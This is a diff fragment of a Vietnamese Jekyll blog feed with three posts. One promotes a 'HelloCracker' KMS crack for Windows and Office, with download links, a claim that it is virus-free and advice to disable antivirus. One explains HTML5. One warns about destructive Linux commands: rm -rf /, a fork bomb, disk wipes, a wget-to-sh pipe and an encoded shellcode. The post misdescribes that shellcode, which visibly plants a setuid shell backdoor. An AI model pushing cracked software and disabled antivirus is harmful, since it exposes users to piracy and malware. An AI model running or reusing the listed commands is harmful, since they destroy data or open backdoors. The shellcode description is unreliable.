+&lt;hr /&gt;</content><author><name>Panadora</name></author><category term="[&quot;other&quot;, &quot;windows&quot;]" /><summary type="html">Trong vài năm qua, bạn có thể đã nghe người ta nói nhiều về HTML5...</summary></entry><entry><title type="html">Kích hoạt Windows 10 và Microsoft Office bằng phần mềm HelloCracker</title><link href="http://localhost:4000/kich-hoat-windows-va-microsoft-office-voi-hello-cracker.html" rel="alternate" type="text/html" title="Kích hoạt Windows 10 và Microsoft Office bằng phần mềm HelloCracker" /><published>2020-06-01T00:00:00+07:00</published><updated>2020-06-01T00:00:00+07:00</updated><id>http://localhost:4000/kich-hoat-windows-va-microsoft-office-voi-hello-cracker</id><content type="html" xml:base="http://localhost:4000/kich-hoat-windows-va-microsoft-office-voi-hello-cracker.html">&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; width=&quot;500&quot; src=&quot;/image/202061Hellocracker.PNG&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;HelloCraker&lt;/code&gt;&lt;/strong&gt; là phần mềm được lập trình bằng ngôn ngữ C# , phần mềm giúp cho việc thao tác kích hoạt key windows một cách đơn giản. Cụ thể phần mềm đã có sẵn những bản key kích hoạt 365 ngày cho từng phiên bản của Windows 10 và Microsoft Office.&lt;/p&gt;
+
+&lt;p&gt;Thông qua nút kích hoạt trên phần mềm, phần mềm sẽ tự động nhập lệnh commadline ( &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;&lt;/strong&gt; ) kích hoạt key qua một server &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kms&lt;/code&gt;&lt;/strong&gt; để xác nhận đã kích hoạt Windows 10 và Microsoft Office và sử dụng được 365 ngày, nếu hết hạn bạn có thể thao tác nhấn nút &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;xóa key&lt;/code&gt;&lt;/strong&gt; và kích hoạt lại cho đến khi hết hạn key.&lt;/p&gt;
+
+&lt;p&gt;Vì là phần mềm kích hoạt bằng commadline ( &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;&lt;/strong&gt; ) thông qua server &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kms&lt;/code&gt;&lt;/strong&gt; vì thế sẽ hoàn toàn sạch 100% nên các bạn có thể yên tâm về vấn đề &lt;code class=&quot;highlighter-rouge&quot;&gt;nhiễm virus&lt;/code&gt; là không nhá. Tuy nhiên khi kích hoạt bạn vẫn cần cho phép gọi lệnh &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;&lt;/strong&gt; với quyền admin để kích hoạt nhá.&lt;/p&gt;
+
+&lt;p&gt;Sơ qua phần mềm, thì thao tác đơn giản bạn chỉ cần chọn phiên bản Windows 10 và Microsoft Office để mở khóa nút kích hoạt sau đó chọn đúng phiên bản Windows 10 và Microsoft Office để kích hoạt.&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; width=&quot;500&quot; src=&quot;/image/202061Hellocracker2.PNG&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; width=&quot;1200&quot; src=&quot;/image/HellorCracker3.PNG&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; width=&quot;1200&quot; src=&quot;/image/HellorCracker4.PNG&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+Nếu AntiVirus của bạn cảnh báo thì hãy tắt nó đi hoặc trước khi tải phần mềm về hãy tắt nó trước nhá.&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;i class=&quot;fas fa-download&quot;&gt;&lt;/i&gt;&lt;a href=&quot;https://www.fshare.vn/file/V18RVUF8JT8E&quot;&gt;Link Download Fshare&lt;/a&gt;&lt;br /&gt;
+&lt;i class=&quot;fas fa-download&quot;&gt;&lt;/i&gt;&lt;a href=&quot;https://www.mediafire.com/file/ig62h8626p29a8p/HelloCracker.rar/file&quot;&gt;Link Download Mediafire&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;New Version HelloCrack 1.0.1 beta&lt;/code&gt;&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; width=&quot;1200&quot; src=&quot;/image/HellorCrackerBeta.PNG&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;i class=&quot;fab fa-google-drive&quot;&gt;&lt;/i&gt;&lt;a href=&quot;https://drive.google.com/file/d/1Z7BdS-LoEmiLp9TQiduba2ldA6vPxX1h/view?usp=sharing&quot;&gt;Link Download Driver&lt;/a&gt;&lt;br /&gt;
+&lt;i class=&quot;fas fa-download&quot;&gt;&lt;a href=&quot;https://www.fshare.vn/file/NWAH9IL7YV9C&quot;&gt;Link Download Fshare&lt;/a&gt;&lt;br /&gt;
+&lt;i class=&quot;fas fa-download&quot;&gt;&lt;a href=&quot;https://www.mediafire.com/file/ekghz82ij52d4yc/HelloCrack-1.0.1.rar/file&quot;&gt;Link Download Mediafire&lt;/a&gt;&lt;br /&gt;&lt;/i&gt;&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;Cảm ơn các bạn đã xem qua, hãy like và share cho mình có thêm động lực để tổng hợp những phần mềm hữu ích nhá ! ^^&lt;/p&gt;
+
+&lt;hr /&gt;</content><author><name>Panadora</name></author><category term="[&quot;windows&quot;, &quot;new&quot;]" /><summary type="html">Thông qua nút kích hoạt trên phần mềm, phần mềm sẽ tự động nhập lệnh commadline</summary></entry><entry><title type="html">HTML5 là gì, và nó đã làm thay đổi cách chúng ta duyệt web như thế nào?</title><link href="http://localhost:4000/html5-la-gi-hoc-lap-trinh-web-co-ban-den-nang-cao.html" rel="alternate" type="text/html" title="HTML5 là gì, và nó đã làm thay đổi cách chúng ta duyệt web như thế nào?" /><published>2020-05-27T00:00:00+07:00</published><updated>2020-05-27T00:00:00+07:00</updated><id>http://localhost:4000/html5-la-gi-hoc-lap-trinh-web-co-ban-den-nang-cao</id><content type="html" xml:base="http://localhost:4000/html5-la-gi-hoc-lap-trinh-web-co-ban-den-nang-cao.html">&lt;center&gt;
+    &lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/hoc-lap-trinh-web-co-ban-truc-tuyen-online-tot-nhat-16032016-1.jpg&quot; /&gt;
+&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Trong vài năm qua, bạn có thể đã nghe người ta nói nhiều về HTML5. Cho dù bạn biết mọi thứ về phát triển web hay không, thì khái niệm này có thể hơi mơ hồ và khó hiểu đối với bạn. Rõ ràng, nó là bước tiếp theo trong quá trình phát triển của HTML, nhưng chính xác nó để làm gì? Tại sao lại có quá nhiều sự hào hứng xung quanh nó? Và tại sao nó lại quan trọng đối với bạn?&lt;/p&gt;
+
+&lt;p&gt;HTML hay HyperText Markup Language, là thành phần quan trọng nhất của World Wide Web. Nó là ngôn ngữ dùng để mô tả những gì một trang web hiển thị. Tuy nhiên, nếu chỉ riêng HTML thôi thì khá nhàm chán bởi vì nó chỉ có thể cung cấp các trang web tĩnh; nhằm đáp ứng nhu cầu ngày càng tăng về các tính năng web ấn tượng hơn, HTML đã được kết hợp với các plugin như CSS, Flash, Java, Silverlight, v.v…&lt;/p&gt;
+
+&lt;p&gt;Nó đã trở thành một cái gì đó khá cồng kềnh và các trình duyệt khác nhau thực hiện những tính năng theo cách riêng của chúng. HTML5 sinh ra để giải quyết những vấn đề lớn của HTML, giúp cho trang web trở nên rõ ràng và hiệu quả hơn.&lt;/p&gt;
+
+&lt;p style=&quot;padding-left: 10px; background: #dddd; border: 1px solid #242424; width: 100%; border-radius: 10px;&quot;&gt;
+Tại TechMaster có khóa học &lt;a href=&quot;https://techmaster.vn/khoa-hoc/25487/web-co-ban-html5-css3-va-javascript&quot;&gt;&quot;Web cơ bản HTML5, CSS3 và Javascript&quot;&lt;/a&gt; dành cho người mới bắt đầu, chưa học lập trình hoặc cho những ai muốn ôn lại kiến thức căn bản về lập trình web.
+&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;HTML: Một cái nhìn tổng quan&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;HTML như chúng ta biết hiện nay được gọi là HTML4 và nó đã được xuất bản lần đầu vào năm 1997. Vâng, điều đó có nghĩa là chúng ta đã sử dụng HTML4 trong hơn 15 năm nay, và đó là một khoảng thời gian rất dài trong lĩnh vực công nghệ. Khoảng năm 2000, một ngôn ngữ đánh dấu được gọi là XHTML bắt đầu được phát triển song song và nó đã được sử dụng khá tốt trong những năm qua, chủ yếu là do các tiêu chuẩn khắt khe mà nó áp đặt. Nhìn chung, mặc dù, hai ngôn ngữ này là tương tự nhau.&lt;/p&gt;
+
+&lt;center&gt;
+    &lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/hoc-lap-trinh-web-co-ban-truc-tuyen-online-tot-nhat-16032016-2.jpg&quot; /&gt;
+&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vấn đề đối với HTML4 là các chức năng của nó rất giới hạn. Nó phải được mở rộng thông qua các plugin như Flash, để cung cấp nhiều tính năng trên text (văn bản) và hình ảnh đơn giản hơn. Ví dụ, nhiều video player đã được tạo ra và duy trì trên nền tảng Flash và nhúng vào các trang HTML. Nhiều ứng dụng web được phát triển sử dụng Java và các applet nhúng vào web.&lt;/p&gt;
+
+&lt;p&gt;Với tất cả các plugin này, nó trở nên khó khăn trong việc duy trì các tiêu chuẩn thích hợp. Lý tưởng nhất, mọi trình duyệt sẽ hiển thị các trang web theo cùng một cách để cung cấp những trải nghiệm tương tự cho mỗi người dùng. Để hiển thị kết quả tương tự trên nhiều trình duyệt, các lập trình viên web thường cần phải thực hiện những sửa chữa nhanh và áp dụng những mẹo vặt trong các phần khác nhau của trang web của họ để thích nghi với các quá trình rendering khác nhau. Điều này sẽ làm cho trang web trở nên cồng kềnh sau một thời gian ngắn.&lt;/p&gt;
+
+&lt;p&gt;Trên một lưu ý thực tế hơn, các trang web yêu cầu các plugin như Flash và Java cuối cùng sẽ sử dụng nhiều CPU và RAM hơn. Bạn đã bao giờ tự hỏi tại sao trình duyệt của mình lại sử dụng quá nhiều tài nguyên của máy tính đến như vậy? Rất nhiều trong số đó có thể xuất phát từ các phần mở rộng HTML. Đây là một trong những lý do tại sao Apple đã không hỗ trợ Flash trên các thiết bị di động của họ (để tiết kiệm pin).&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vậy chính xác HTML5 là gì?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;center&gt;
+    &lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/hoc-lap-trinh-web-co-ban-truc-tuyen-online-tot-nhat-16032016-3.jpg&quot; /&gt;
+&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cụ thể hơn, HTML5 đã bổ sung thêm rất nhiều các thẻ đánh dấu (markup) mới:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Các thẻ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;header&amp;gt;&lt;/code&gt; và &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;footer&amp;gt;&lt;/code&gt; :&lt;/strong&gt;
+giúp bạn tách các phần trên và dưới của các block nội dung. Để có thể sử dụng nhiều lần trên một trang duy nhất.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Thẻ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;article&amp;gt;&lt;/code&gt; :&lt;/strong&gt;
+Giúp xác định một phần cụ thể về nội dung, ví dụ, một bài blog hoặc một bình luận của độc giả.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Thẻ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;nav&amp;gt;&lt;/code&gt;:&lt;/strong&gt; 
+Để xác định những phần nào được coi là khối điều hướng.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Thẻ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;section&amp;gt;&lt;/code&gt; :&lt;/strong&gt; 
+Cho phép bạn xác định một phần nội dung nào đó; tương tự như các thẻ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;div&amp;gt;&lt;/code&gt; hiện nay.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Các thẻ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;audio&amp;gt;&lt;/code&gt; và &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;video&amp;gt;&lt;/code&gt; :&lt;/strong&gt;
+Để đánh dấu những nội dung bao gồm âm thanh hoặc video.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Thẻ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt; :&lt;/strong&gt;
+Cho phép bạn vẽ đồ họa sử dụng một ngôn ngữ kịch bản riêng biệt.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Thẻ &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;embed&amp;gt;&lt;/code&gt; :&lt;/strong&gt;
+Dùng để nhúng các nội dung hoặc các ứng dụng bên ngoài vào trang web.&lt;/p&gt;
+
+&lt;p&gt;HTML5 cũng bỏ đi một số thẻ: &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;acronym&amp;gt;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;applet&amp;gt;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;font&amp;gt;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;frame&amp;gt;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;frameset&amp;gt;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;noframes&amp;gt;&lt;/code&gt;&lt;/strong&gt;, và một số thẻ khác.&lt;/p&gt;
+
+&lt;p&gt;Các tiêu chuẩn đặc tả kỹ thuật đầy đủ cho HTML5 đã được lên kế hoạch hoàn thành từ năm 2014, nhưng HTML5 đã có nhiều tiến bộ đã và nó có thể được sử dụng để thực hiện các tính năng cho đến hiện nay. Các tiêu chuẩn đặc tả kỹ thuật đầy đủ cho HTML5.1 dự kiến ​​sẽ được hoàn thành vào năm 2016.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Tại sao HTML5 lại quan trọng đối với bạn&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Là một người sử dụng web, bạn sẽ được hưởng lợi từ HTML5 bởi vì nó đã sửa chữa những vấn đề hay gặp phải trong HTML4. Các trang web sẽ có những tiêu chuẩn web tốt hơn, giúp cho việc hiển thị nội dung hiệu quả hơn và cải thiện hiệu suất. Khi HTML5 được phổ biến trên diện rộng, các trang web sẽ có tốc độ tải nhanh hơn, băng thông sử dụng ít hơn, và tuổi thọ pin của các thiết bị di động sẽ được kéo dài hơn.&lt;/p&gt;
+
+&lt;p&gt;Thêm vào đó, bạn sẽ không cần phải luôn để ý đến các bản cập nhật của các plugin như Flash và Java. Tôi rất ghét việc phải liên tục cập nhật rất nhiều addons và plugins trên nhiều trình duyệt. Và điều gì sẽ xảy ra khi một trong số chúng có phiên bản không phù hợp? Các trang web sẽ ngừng hoạt động và mang lại nhiều nỗi thất vọng. Tất cả điều đó sẽ được giải quyết ngay khi HTML5 trở thành tiêu chuẩn chính.&lt;/p&gt;
+
+&lt;center&gt;
+    &lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/hoc-lap-trinh-web-co-ban-truc-tuyen-online-tot-nhat-16032016-4.jpg&quot; /&gt;
+&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nếu bạn chỉ là một người sử dụng web bình thường và bạn không có ý định viết code hoặc tạo ra trang web của riêng mình, thì bạn không cần phải làm bất cứ điều gì để được hưởng những tính năng tuyệt vời của HTML5. Tất cả các trình duyệt phổ biến hiện nay đều đã hỗ trợ HTML5 ở một mức độ nào đó và bạn có thể đã sử dụng nó mà không biết. Chỉ cần giữ cho trình duyệt của mình luôn cập nhật và bạn sẽ cảm nhận được những tính năng mới.&lt;/p&gt;
+
+&lt;p&gt;Và nếu bạn là một nhà phát triển web, HTML5 sẽ làm cho mọi thứ đơn giản và dễ dàng hơn cho bạn. Nếu mọi việc suôn sẻ, bạn sẽ không phải vật lộn với các vấn đề trong thiết kế web như ở phiên bản HTML cũ, vì tất cả các trình duyệt sẽ cần phải tuân thủ cùng một bộ tiêu chuẩn mới.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Kết luận&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;HTML5 là tương lai của trình duyệt web và nó chắc chắn sẽ cách mạng hóa cách chúng ta lướt web. Thậm chí dưới những hạn chế của HTML4, các lập trình viên cũng đã tạo ra một số trang web rất tuyệt vời, vì vậy sẽ rất thú vị để xem những gì sắp được thực hiện với các chức năng của HTML5.&lt;/p&gt;
+
+&lt;p&gt;Hy vọng rằng giờ đây bạn đã có thể nhìn thấy HTML5 một cách rõ ràng hơn và biết tại sao nó lại được thổi phồng lên nhiều đến như vậy. Nếu bạn có bất kỳ câu hỏi nào, xin hãy để lại ý kiến trong phần bình luận phía dưới nhé!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Nguồn: &lt;a href=&quot;https://techmaster.vn/posts/33804/html5-la-gi-hoc-lap-trinh-web-co-ban-den-nang-cao?fbclid=IwAR06lAmlmuthMOeGKTpoZgLDTOCMJLI02j_ftRBWmUgLqzJHpinSCOGtJw4#toc-html-m-t-c-i-nh-n-t-ng-quan&quot;&gt;techmaster.vn&lt;/a&gt;&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;html&quot;, &quot;unixlinux&quot;, &quot;windows&quot;]" /><summary type="html">Trong vài năm qua, bạn có thể đã nghe người ta nói nhiều về HTML5...</summary></entry><entry><title type="html">Top các câu lệnh nguy hiểm trên linux ban cần chú ý khi sử dụng</title><link href="http://localhost:4000/top-cac-cau-lenh-nguy-hiem-tren-linux-ban-can-chu-y-khi-su-dung.html" rel="alternate" type="text/html" title="Top các câu lệnh nguy hiểm trên linux ban cần chú ý khi sử dụng" /><published>2020-05-25T00:00:00+07:00</published><updated>2020-05-25T00:00:00+07:00</updated><id>http://localhost:4000/top-cac-cau-lenh-nguy-hiem-tren-linux-ban-can-chu-y-khi-su-dung</id><content type="html" xml:base="http://localhost:4000/top-cac-cau-lenh-nguy-hiem-tren-linux-ban-can-chu-y-khi-su-dung.html">&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; width=&quot;550&quot; src=&quot;http://localhost:4000/image/2020525-Caution-Command-Terminal.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Như bạn đã biết, các câu lệnh trong Terminal thực sự rất hữu dụng và giúp cho người sử dụng có thể thao tác cực nhanh mà không cần phải qua GUI rườm rà. Tuy nhiên, nó cũng có nhiều rủi ro nếu như bạn sử dụng nó sai cách hoặc bạn không hề biết bạn đang thực thi câu lệnh có độ nguy hiểm như thế nào đối với hệ thống.&lt;/p&gt;
+
+&lt;p&gt;Bài viết này sẽ sơ lược qua các câu lệnh cực kỳ nguy hiểm cho Linux, nếu các câu lệnh này được thực thi, bạn có thể bị mất toàn bộ dữ liệu trong máy hoặc hệ điều hành sẽ không bao giờ khởi động được nữa.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Xin lưu ý một lần nữa, bài viết này chỉ có tính chất tham khảo, hạn chế hoặc không chạy các câu lệnh bên dưới để tránh tạo rủi ro gây mất mát dữ liệu hoặc hỏng HĐH&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh: rm -rf&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Đây là 1 trong những cách nhanh nhất để xoá file và folder, nhưng nếu nhập sai hoặc bạn không hiểu bản chất của câu lệnh này là gì thì sẽ gây ảnh hưởng nặng nề đến hệ thống.&lt;/p&gt;
+
+&lt;p&gt;Một số cách sử dụng câu lệnh này như bên dưới:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm &amp;lt;tên file&amp;gt;&lt;/code&gt;&lt;/strong&gt; : xoá file cụ thể.&lt;br /&gt;
+&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -r&lt;/code&gt;&lt;/strong&gt; : xoá toàn bộ folder, kể cả folder rỗng.&lt;br /&gt;
+&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -f&lt;/code&gt;&lt;/strong&gt; : bắt buộc xóa file (f ở đây là từ force). Lệnh này bỏ qua các tập tin ko tồn tại và sẽ không hiện ra cảnh báo trước khi xoá. (vì là bắt buộc nên xoá các file &lt;strong&gt;write protected&lt;/strong&gt; và &lt;strong&gt;read only&lt;/strong&gt; luôn).&lt;br /&gt;
+&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -rf /&lt;/code&gt;&lt;/strong&gt; : buộc xoá tất cả mọi thứ trong folder gốc, kể cả folder được bảo vệ.&lt;br /&gt;
+&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -rf *&lt;/code&gt;&lt;/strong&gt; : buộc xoá tất cả mọi thứ trong folder bạn đang làm việc.&lt;br /&gt;
+&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm -rf .&lt;/code&gt;&lt;/strong&gt; : buộc xoá tất cả folder hiện tại và sub-folder.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;CÂU LỆNH&amp;gt; &amp;gt;&lt;/code&gt; /dev/sda&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Câu lệnh bên trên sẽ ghi output của &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;CÂU LỆNH&amp;gt;&lt;/code&gt;&lt;/strong&gt; được thực hiện lên ổ cứng (ở đây là /DEV/SDA) và sẽ ghi đè và xóa sổ toàn bộ dữ liệu có sẵn trong đó.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;:(){:|:&amp;amp;};:&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Lệnh này thực chất là 1 quả bom, nó thực thi bằng việc định nghĩa hàm ‘:’ và hàm này tự gọi lại chính nó (đệ quy). Nó sẽ sao chép chính bản thân nó nhiều lần và liên tục, gây tràn bộ nhớ hệ thống, dẫn tới đóng băng hệ thống.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;mv &amp;lt;TÊN FOLDER&amp;gt; /dev/null&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Nếu bạn thực thi lệnh này, nó sẽ di chuyển &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;TÊN FOLDER&amp;gt;&lt;/code&gt;&lt;/strong&gt; đến &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/null&lt;/code&gt;&lt;/strong&gt;. Mà nơi này chính là một “lỗ đen” đúng nghĩa. Mọi dữ liệu di chuyển đến đây đều biến mất mãi mãi.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://trang_chua_ma_doc -O- | sh&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Câu lệnh ở trên sẽ tải script từ một trang chữa mã độc và thực thi với lệnh SH&lt;/p&gt;
+
+&lt;p&gt;Hãy chắc chắn bạn tin tưởng với trang web ở trong câu lệnh này, đừng copy, paste và thực thi vô tội vạ các lệnh ở trên mạng.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;mkfs.ext3 /dev/sda&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Lệnh này thì sẽ format lại toàn bộ dữ liệu trong ổ cứng, dữ liệu chắn chắn sẽ biến mất hoàn toàn khi thực thi nó.&lt;/p&gt;
+
+&lt;p&gt;Một số câu lệnh tương tự dùng để format ổ cứng (cần quyền sudo)&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;mkfs&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;mkfs.ext3&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;mkfs.bfs&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;mkfs.ext2&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;mkfs.minix&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;mkfs.msdos&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;mkfs.reiserfs&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;mkfs.vfat&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Riêng mkfs.cramfs tác dụng tương tự như không cần sudo.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt; &amp;lt;FILE&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Xoá toàn bộ nội dung của &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;FILE&amp;gt;&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;^foo^bar&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;được sử dụng để chỉnh sửa lệnh chạy trước đó mà không cần phải gõ lại toàn bộ câu lệnh. Nhưng có thể gây rắc rối nếu bạn không kiểm tra kỹ lưỡng thay đổi trong câu lệnh ban đầu.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lệnh: &lt;code class=&quot;highlighter-rouge&quot;&gt;dd if=/dev/random of=/dev/sda&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Câu lệnh trên sẽ xóa sạch ổ cứng và ghi dữ liệu rác vào. Tất nhiên! Hệ thống của bạn sẽ bị hỏng hoàn toàn và khả năng phục hồi gần như = 0&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;NHỮNG CÂU LỆNH NGUY HIỂM ĐÃ ĐƯỢC MÃ HOÁ&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+release */
+= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
+“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
+“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
+“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
+“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
+“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
+“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
+“cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;”;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Hẳn bạn nghĩ lệnh trên không gây ra vấn đề gì, nhưng không! Lệnh bên trên sẽ xoá phân vùng gốc ổ cứng của bạn.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Bạn tuyệt đối không được copy, paste và thực thi một trong các câu lệnh không rõ nguồn gốc từ Internet để tránh những thiệt hại gây ra cho Linux do sự bất cẩn của bản thân mình.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;~~ Bài viết có kham thảo từ các nguồn uy tín ~~
+P/s: nếu mình có sai sót gì trong bài viết thì mong các bạn góp ý để mình có thể chỉnh sửa bài viết và hoàn thiện nó một cách tốt nhất nhé :)&lt;/p&gt;
+
+&lt;p&gt;Nguồn: &lt;a href=&quot;https://www.facebook.com/groups/linuxteamvietnam2018/permalink/856171831568486/&quot;&gt;Linux Team Việt Nam (Official Group) Post 1&lt;/a&gt;&lt;br /&gt;
+Nguồn: &lt;a href=&quot;https://www.facebook.com/groups/linuxteamvietnam2018/permalink/856981638154172/&quot;&gt;Linux Team Việt Nam (Official Group) Post 2&lt;/a&gt;&lt;/p&gt;
+
